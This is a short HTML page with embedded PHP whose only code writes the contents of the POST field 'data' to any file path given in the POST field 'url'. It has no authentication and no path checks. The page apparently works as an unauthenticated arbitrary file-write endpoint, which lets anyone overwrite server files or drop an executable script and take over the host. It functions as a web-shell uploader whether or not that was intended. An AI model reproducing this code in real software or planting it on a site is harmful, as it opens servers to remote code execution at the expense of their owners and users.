<!DOCTYPE html>
<html style="background-color:#f7f7f7;">
	<body>
		<?php
			$file = fopen($_POST['url'],"w");
			echo fwrite($file, $_POST['data']);
			fclose($file);
			
		?>
	</body>
</html>